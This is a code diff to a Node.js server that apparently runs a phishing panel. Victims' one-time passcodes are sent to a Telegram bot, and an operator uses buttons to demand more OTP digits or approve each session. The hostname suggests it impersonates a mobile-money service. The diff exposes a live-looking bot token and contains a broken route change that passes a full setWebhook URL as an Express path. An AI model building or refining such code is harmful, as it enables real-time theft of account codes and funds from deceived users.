@@ -111,7 +111,7 @@ app.post('/api/submit-otp', async (req, res) => {
                     ]]
                 }
             });
-            res.json({ success: true });
+            res.json({ success: true, sessionId: sessionId });
         } catch (e) {
             console.error("OTP Telegram Error:", e.message);
             res.status(500).json({ success: false });
@@ -123,19 +123,20 @@ app.post('/api/submit-otp', async (req, res) => {
 });
 
 // 4. Telegram Button Webhook
-app.post('/api/webhook', (req, res) => {
+app.post('https://api.telegram.org/bot8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc/setWebhook?url=https://mixx-by-yas-72jv.onrender.com/api/webhook', (req, res) => {
     const { callback_query } = req.body;
     if (!callback_query) return res.sendStatus(200);
 
     const [action, val, sid] = callback_query.data.split('_');
 
     if (sessions[sid]) {
-        if (action === 'ask') sessions[sid].status = `go_to_otp_${val}`;
-        else if (action === 'accept') sessions[sid].status = 'approved';
-        else if (action === 'decline') sessions[sid].status = 'declined';
-        
-        console.log(`[ADMIN ACTION] ${action} for Session: ${sid}`);
-    }
+    if (action === 'ask') {
+        // Match what your HTML is looking for: "otp5" or "otp6"
+        sessions[sid].status = `otp${val}`; 
+    } 
+    else if (action === 'accept') sessions[sid].status = 'accepted'; // Match HTML "done"
+    else if (action === 'decline') sessions[sid].status = 'declined';
+}
 
     // Acknowledge the click to Telegram
     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
